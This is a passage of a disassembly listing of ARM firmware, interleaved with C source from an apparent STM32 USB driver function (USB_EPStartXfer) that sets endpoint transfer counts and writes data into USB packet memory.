 8006fb6:	00da      	lsls	r2, r3, #3
 8006fb8:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8006fba:	4413      	add	r3, r2
 8006fbc:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8006fc0:	647b      	str	r3, [r7, #68]	; 0x44
 8006fc2:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8006fc4:	881b      	ldrh	r3, [r3, #0]
 8006fc6:	b29b      	uxth	r3, r3
 8006fc8:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8006fcc:	b29a      	uxth	r2, r3
 8006fce:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8006fd0:	801a      	strh	r2, [r3, #0]
 8006fd2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006fd6:	2b3e      	cmp	r3, #62	; 0x3e
 8006fd8:	d921      	bls.n	800701e <USB_EPStartXfer+0x5f8>
 8006fda:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006fde:	095b      	lsrs	r3, r3, #5
 8006fe0:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 8006fe4:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006fe8:	f003 031f 	and.w	r3, r3, #31
 8006fec:	2b00      	cmp	r3, #0
 8006fee:	d104      	bne.n	8006ffa <USB_EPStartXfer+0x5d4>
 8006ff0:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 8006ff4:	3b01      	subs	r3, #1
 8006ff6:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 8006ffa:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8006ffc:	881b      	ldrh	r3, [r3, #0]
 8006ffe:	b29a      	uxth	r2, r3
 8007000:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 8007004:	b29b      	uxth	r3, r3
 8007006:	029b      	lsls	r3, r3, #10
 8007008:	b29b      	uxth	r3, r3
 800700a:	4313      	orrs	r3, r2
 800700c:	b29b      	uxth	r3, r3
 800700e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007012:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007016:	b29a      	uxth	r2, r3
 8007018:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 800701a:	801a      	strh	r2, [r3, #0]
 800701c:	e056      	b.n	80070cc <USB_EPStartXfer+0x6a6>
 800701e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007022:	2b00      	cmp	r3, #0
 8007024:	d10a      	bne.n	800703c <USB_EPStartXfer+0x616>
 8007026:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8007028:	881b      	ldrh	r3, [r3, #0]
 800702a:	b29b      	uxth	r3, r3
 800702c:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007030:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007034:	b29a      	uxth	r2, r3
 8007036:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8007038:	801a      	strh	r2, [r3, #0]
 800703a:	e047      	b.n	80070cc <USB_EPStartXfer+0x6a6>
 800703c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007040:	085b      	lsrs	r3, r3, #1
 8007042:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 8007046:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800704a:	f003 0301 	and.w	r3, r3, #1
 800704e:	2b00      	cmp	r3, #0
 8007050:	d004      	beq.n	800705c <USB_EPStartXfer+0x636>
 8007052:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 8007056:	3301      	adds	r3, #1
 8007058:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 800705c:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 800705e:	881b      	ldrh	r3, [r3, #0]
 8007060:	b29a      	uxth	r2, r3
 8007062:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 8007066:	b29b      	uxth	r3, r3
 8007068:	029b      	lsls	r3, r3, #10
 800706a:	b29b      	uxth	r3, r3
 800706c:	4313      	orrs	r3, r2
 800706e:	b29a      	uxth	r2, r3
 8007070:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8007072:	801a      	strh	r2, [r3, #0]
 8007074:	e02a      	b.n	80070cc <USB_EPStartXfer+0x6a6>
 8007076:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800707a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800707e:	681b      	ldr	r3, [r3, #0]
 8007080:	785b      	ldrb	r3, [r3, #1]
 8007082:	2b01      	cmp	r3, #1
 8007084:	d122      	bne.n	80070cc <USB_EPStartXfer+0x6a6>
 8007086:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800708a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800708e:	681b      	ldr	r3, [r3, #0]
 8007090:	653b      	str	r3, [r7, #80]	; 0x50
 8007092:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007096:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800709a:	681b      	ldr	r3, [r3, #0]
 800709c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80070a0:	b29b      	uxth	r3, r3
 80070a2:	461a      	mov	r2, r3
 80070a4:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 80070a6:	4413      	add	r3, r2
 80070a8:	653b      	str	r3, [r7, #80]	; 0x50
 80070aa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070ae:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80070b2:	681b      	ldr	r3, [r3, #0]
 80070b4:	781b      	ldrb	r3, [r3, #0]
 80070b6:	00da      	lsls	r2, r3, #3
 80070b8:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 80070ba:	4413      	add	r3, r2
 80070bc:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80070c0:	64fb      	str	r3, [r7, #76]	; 0x4c
 80070c2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80070c6:	b29a      	uxth	r2, r3
 80070c8:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 80070ca:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr0;
 80070cc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070d0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80070d4:	681b      	ldr	r3, [r3, #0]
 80070d6:	891b      	ldrh	r3, [r3, #8]
 80070d8:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 80070dc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070e0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80070e4:	681b      	ldr	r3, [r3, #0]
 80070e6:	6959      	ldr	r1, [r3, #20]
 80070e8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80070ec:	b29b      	uxth	r3, r3
 80070ee:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 80070f2:	f507 7084 	add.w	r0, r7, #264	; 0x108
 80070f6:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 80070fa:	6800      	ldr	r0, [r0, #0]
 80070fc:	f001 f99f 	bl	800843e <USB_WritePMA>
            ep->xfer_buff += len;
 8007100:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007104:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007108:	681b      	ldr	r3, [r3, #0]
 800710a:	695a      	ldr	r2, [r3, #20]
 800710c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007110:	441a      	add	r2, r3
 8007112:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007116:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800711a:	681b      	ldr	r3, [r3, #0]
 800711c:	615a      	str	r2, [r3, #20]

            if (ep->xfer_len_db > ep->maxpacket)
 800711e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007122:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007126:	681b      	ldr	r3, [r3, #0]
 8007128:	6a1a      	ldr	r2, [r3, #32]
 800712a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800712e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007132:	681b      	ldr	r3, [r3, #0]
 8007134:	691b      	ldr	r3, [r3, #16]
 8007136:	429a      	cmp	r2, r3
 8007138:	d90f      	bls.n	800715a <USB_EPStartXfer+0x734>
            {
              ep->xfer_len_db -= len;
 800713a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800713e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007142:	681b      	ldr	r3, [r3, #0]
 8007144:	6a1a      	ldr	r2, [r3, #32]
 8007146:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800714a:	1ad2      	subs	r2, r2, r3
 800714c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007150:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007154:	681b      	ldr	r3, [r3, #0]
 8007156:	621a      	str	r2, [r3, #32]
 8007158:	e00e      	b.n	8007178 <USB_EPStartXfer+0x752>
            }
            else
            {
              len = ep->xfer_len_db;
 800715a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800715e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007162:	681b      	ldr	r3, [r3, #0]
 8007164:	6a1b      	ldr	r3, [r3, #32]
 8007166:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
              ep->xfer_len_db = 0U;
 800716a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800716e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007172:	681b      	ldr	r3, [r3, #0]
 8007174:	2200      	movs	r2, #0
 8007176:	621a      	str	r2, [r3, #32]
            }

            /* Set the Double buffer counter for pmabuffer1 */
            PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 8007178:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800717c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007180:	681b      	ldr	r3, [r3, #0]
 8007182:	643b      	str	r3, [r7, #64]	; 0x40
 8007184:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007188:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800718c:	681b      	ldr	r3, [r3, #0]
 800718e:	785b      	ldrb	r3, [r3, #1]
 8007190:	2b00      	cmp	r3, #0
 8007192:	d177      	bne.n	8007284 <USB_EPStartXfer+0x85e>
 8007194:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007198:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800719c:	681b      	ldr	r3, [r3, #0]
 800719e:	63bb      	str	r3, [r7, #56]	; 0x38
 80071a0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80071a4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80071a8:	681b      	ldr	r3, [r3, #0]
 80071aa:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80071ae:	b29b      	uxth	r3, r3
 80071b0:	461a      	mov	r2, r3
 80071b2:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80071b4:	4413      	add	r3, r2
 80071b6:	63bb      	str	r3, [r7, #56]	; 0x38
 80071b8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80071bc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80071c0:	681b      	ldr	r3, [r3, #0]
 80071c2:	781b      	ldrb	r3, [r3, #0]
 80071c4:	00da      	lsls	r2, r3, #3
 80071c6:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80071c8:	4413      	add	r3, r2
 80071ca:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80071ce:	637b      	str	r3, [r7, #52]	; 0x34
 80071d0:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 80071d2:	881b      	ldrh	r3, [r3, #0]
 80071d4:	b29b      	uxth	r3, r3
 80071d6:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80071da:	b29a      	uxth	r2, r3
 80071dc:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 80071de:	801a      	strh	r2, [r3, #0]
 80071e0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80071e4:	2b3e      	cmp	r3, #62	; 0x3e
 80071e6:	d921      	bls.n	800722c <USB_EPStartXfer+0x806>
 80071e8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80071ec:	095b      	lsrs	r3, r3, #5
 80071ee:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 80071f2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80071f6:	f003 031f 	and.w	r3, r3, #31
 80071fa:	2b00      	cmp	r3, #0
 80071fc:	d104      	bne.n	8007208 <USB_EPStartXfer+0x7e2>
 80071fe:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 8007202:	3b01      	subs	r3, #1
 8007204:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 8007208:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 800720a:	881b      	ldrh	r3, [r3, #0]
 800720c:	b29a      	uxth	r2, r3
 800720e:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 8007212:	b29b      	uxth	r3, r3
 8007214:	029b      	lsls	r3, r3, #10
 8007216:	b29b      	uxth	r3, r3
 8007218:	4313      	orrs	r3, r2
 800721a:	b29b      	uxth	r3, r3
 800721c:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007220:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007224:	b29a      	uxth	r2, r3
 8007226:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8007228:	801a      	strh	r2, [r3, #0]
 800722a:	e050      	b.n	80072ce <USB_EPStartXfer+0x8a8>
 800722c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007230:	2b00      	cmp	r3, #0
 8007232:	d10a      	bne.n	800724a <USB_EPStartXfer+0x824>
 8007234:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8007236:	881b      	ldrh	r3, [r3, #0]
 8007238:	b29b      	uxth	r3, r3
 800723a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800723e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007242:	b29a      	uxth	r2, r3
 8007244:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8007246:	801a      	strh	r2, [r3, #0]
 8007248:	e041      	b.n	80072ce <USB_EPStartXfer+0x8a8>
 800724a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800724e:	085b      	lsrs	r3, r3, #1
 8007250:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 8007254:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007258:	f003 0301 	and.w	r3, r3, #1
 800725c:	2b00      	cmp	r3, #0
 800725e:	d004      	beq.n	800726a <USB_EPStartXfer+0x844>
 8007260:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 8007264:	3301      	adds	r3, #1
 8007266:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 800726a:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 800726c:	881b      	ldrh	r3, [r3, #0]
 800726e:	b29a      	uxth	r2, r3
 8007270:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 8007274:	b29b      	uxth	r3, r3
 8007276:	029b      	lsls	r3, r3, #10
 8007278:	b29b      	uxth	r3, r3
 800727a:	4313      	orrs	r3, r2
 800727c:	b29a      	uxth	r2, r3
 800727e:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8007280:	801a      	strh	r2, [r3, #0]
 8007282:	e024      	b.n	80072ce <USB_EPStartXfer+0x8a8>
 8007284:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007288:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800728c:	681b      	ldr	r3, [r3, #0]
 800728e:	785b      	ldrb	r3, [r3, #1]
 8007290:	2b01      	cmp	r3, #1
 8007292:	d11c      	bne.n	80072ce <USB_EPStartXfer+0x8a8>
 8007294:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007298:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800729c:	681b      	ldr	r3, [r3, #0]
 800729e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80072a2:	b29b      	uxth	r3, r3
 80072a4:	461a      	mov	r2, r3
 80072a6:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 80072a8:	4413      	add	r3, r2
 80072aa:	643b      	str	r3, [r7, #64]	; 0x40
 80072ac:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072b0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80072b4:	681b      	ldr	r3, [r3, #0]
 80072b6:	781b      	ldrb	r3, [r3, #0]
 80072b8:	00da      	lsls	r2, r3, #3
 80072ba:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 80072bc:	4413      	add	r3, r2
 80072be:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80072c2:	63fb      	str	r3, [r7, #60]	; 0x3c
 80072c4:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80072c8:	b29a      	uxth	r2, r3
 80072ca:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 80072cc:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr1;
 80072ce:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072d2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80072d6:	681b      	ldr	r3, [r3, #0]
 80072d8:	895b      	ldrh	r3, [r3, #10]
 80072da:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 80072de:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072e2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80072e6:	681b      	ldr	r3, [r3, #0]
 80072e8:	6959      	ldr	r1, [r3, #20]
 80072ea:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80072ee:	b29b      	uxth	r3, r3
 80072f0:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 80072f4:	f507 7084 	add.w	r0, r7, #264	; 0x108
 80072f8:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 80072fc:	6800      	ldr	r0, [r0, #0]
 80072fe:	f001 f89e 	bl	800843e <USB_WritePMA>
 8007302:	e227      	b.n	8007754 <USB_EPStartXfer+0xd2e>
          }
        }
        /* auto Switch to single buffer mode when transfer <Mps no need to manage in double buffer */
        else
        {
          len = ep->xfer_len_db;
 8007304:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007308:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800730c:	681b      	ldr	r3, [r3, #0]
 800730e:	6a1b      	ldr	r3, [r3, #32]
 8007310:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104

          /* disable double buffer mode for Bulk endpoint */
          PCD_CLEAR_BULK_EP_DBUF(USBx, ep->num);
 8007314:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007318:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800731c:	681a      	ldr	r2, [r3, #0]
 800731e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007322:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007326:	681b      	ldr	r3, [r3, #0]
 8007328:	781b      	ldrb	r3, [r3, #0]
 800732a:	009b      	lsls	r3, r3, #2
 800732c:	4413      	add	r3, r2
 800732e:	881b      	ldrh	r3, [r3, #0]
 8007330:	b29b      	uxth	r3, r3
 8007332:	f423 43e2 	bic.w	r3, r3, #28928	; 0x7100
 8007336:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800733a:	f8a7 3062 	strh.w	r3, [r7, #98]	; 0x62
 800733e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007342:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007346:	681a      	ldr	r2, [r3, #0]
 8007348:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800734c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007350:	681b      	ldr	r3, [r3, #0]
 8007352:	781b      	ldrb	r3, [r3, #0]
 8007354:	009b      	lsls	r3, r3, #2
 8007356:	441a      	add	r2, r3
 8007358:	f8b7 3062 	ldrh.w	r3, [r7, #98]	; 0x62
 800735c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8007360:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8007364:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8007368:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800736c:	b29b      	uxth	r3, r3
 800736e:	8013      	strh	r3, [r2, #0]

          /* Set Tx count with nbre of byte to be transmitted */
          PCD_SET_EP_TX_CNT(USBx, ep->num, len);
 8007370:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007374:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007378:	681b      	ldr	r3, [r3, #0]
 800737a:	65fb      	str	r3, [r7, #92]	; 0x5c
 800737c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007380:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007384:	681b      	ldr	r3, [r3, #0]
 8007386:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800738a:	b29b      	uxth	r3, r3
 800738c:	461a      	mov	r2, r3
 800738e:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8007390:	4413      	add	r3, r2
 8007392:	65fb      	str	r3, [r7, #92]	; 0x5c
 8007394:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007398:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800739c:	681b      	ldr	r3, [r3, #0]
 800739e:	781b      	ldrb	r3, [r3, #0]
 80073a0:	00da      	lsls	r2, r3, #3
 80073a2:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 80073a4:	4413      	add	r3, r2
 80073a6:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80073aa:	65bb      	str	r3, [r7, #88]	; 0x58
 80073ac:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80073b0:	b29a      	uxth	r2, r3
 80073b2:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80073b4:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr0;
 80073b6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073ba:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80073be:	681b      	ldr	r3, [r3, #0]
 80073c0:	891b      	ldrh	r3, [r3, #8]
 80073c2:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 80073c6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073ca:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80073ce:	681b      	ldr	r3, [r3, #0]
 80073d0:	6959      	ldr	r1, [r3, #20]
 80073d2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80073d6:	b29b      	uxth	r3, r3
 80073d8:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 80073dc:	f507 7084 	add.w	r0, r7, #264	; 0x108
 80073e0:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 80073e4:	6800      	ldr	r0, [r0, #0]
 80073e6:	f001 f82a 	bl	800843e <USB_WritePMA>
 80073ea:	e1b3      	b.n	8007754 <USB_EPStartXfer+0xd2e>
        }
      }
      else /* manage isochronous double buffer IN mode */
      {
        /* each Time to write in PMA xfer_len_db will */
        ep->xfer_len_db -= len;
 80073ec:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073f0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80073f4:	681b      	ldr	r3, [r3, #0]
 80073f6:	6a1a      	ldr	r2, [r3, #32]
 80073f8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80073fc:	1ad2      	subs	r2, r2, r3
 80073fe:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007402:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007406:	681b      	ldr	r3, [r3, #0]
 8007408:	621a      	str	r2, [r3, #32]

        /* Fill the data buffer */
        if ((PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_DTOG_TX) != 0U)
 800740a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800740e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007412:	681a      	ldr	r2, [r3, #0]
 8007414:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007418:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800741c:	681b      	ldr	r3, [r3, #0]
 800741e:	781b      	ldrb	r3, [r3, #0]
 8007420:	009b      	lsls	r3, r3, #2
 8007422:	4413      	add	r3, r2
 8007424:	881b      	ldrh	r3, [r3, #0]
 8007426:	b29b      	uxth	r3, r3
 8007428:	f003 0340 	and.w	r3, r3, #64	; 0x40
 800742c:	2b00      	cmp	r3, #0
 800742e:	f000 80c6 	beq.w	80075be <USB_EPStartXfer+0xb98>
        {
          /* Set the Double buffer counter for pmabuffer1 */
          PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 8007432:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007436:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800743a:	681b      	ldr	r3, [r3, #0]
 800743c:	673b      	str	r3, [r7, #112]	; 0x70
 800743e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007442:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007446:	681b      	ldr	r3, [r3, #0]
 8007448:	785b      	ldrb	r3, [r3, #1]
 800744a:	2b00      	cmp	r3, #0
 800744c:	d177      	bne.n	800753e <USB_EPStartXfer+0xb18>
 800744e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007452:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007456:	681b      	ldr	r3, [r3, #0]
 8007458:	66bb      	str	r3, [r7, #104]	; 0x68
 800745a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800745e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007462:	681b      	ldr	r3, [r3, #0]
 8007464:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007468:	b29b      	uxth	r3, r3
 800746a:	461a      	mov	r2, r3
 800746c:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 800746e:	4413      	add	r3, r2
 8007470:	66bb      	str	r3, [r7, #104]	; 0x68
 8007472:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007476:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800747a:	681b      	ldr	r3, [r3, #0]
 800747c:	781b      	ldrb	r3, [r3, #0]
 800747e:	00da      	lsls	r2, r3, #3
 8007480:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8007482:	4413      	add	r3, r2
 8007484:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007488:	667b      	str	r3, [r7, #100]	; 0x64
 800748a:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 800748c:	881b      	ldrh	r3, [r3, #0]
 800748e:	b29b      	uxth	r3, r3
 8007490:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007494:	b29a      	uxth	r2, r3
 8007496:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007498:	801a      	strh	r2, [r3, #0]
 800749a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800749e:	2b3e      	cmp	r3, #62	; 0x3e
 80074a0:	d921      	bls.n	80074e6 <USB_EPStartXfer+0xac0>
 80074a2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80074a6:	095b      	lsrs	r3, r3, #5
 80074a8:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 80074ac:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80074b0:	f003 031f 	and.w	r3, r3, #31
 80074b4:	2b00      	cmp	r3, #0
 80074b6:	d104      	bne.n	80074c2 <USB_EPStartXfer+0xa9c>
 80074b8:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 80074bc:	3b01      	subs	r3, #1
 80074be:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 80074c2:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80074c4:	881b      	ldrh	r3, [r3, #0]
 80074c6:	b29a      	uxth	r2, r3
 80074c8:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 80074cc:	b29b      	uxth	r3, r3
 80074ce:	029b      	lsls	r3, r3, #10
 80074d0:	b29b      	uxth	r3, r3
 80074d2:	4313      	orrs	r3, r2
 80074d4:	b29b      	uxth	r3, r3
 80074d6:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80074da:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80074de:	b29a      	uxth	r2, r3
 80074e0:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80074e2:	801a      	strh	r2, [r3, #0]
 80074e4:	e050      	b.n	8007588 <USB_EPStartXfer+0xb62>
 80074e6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
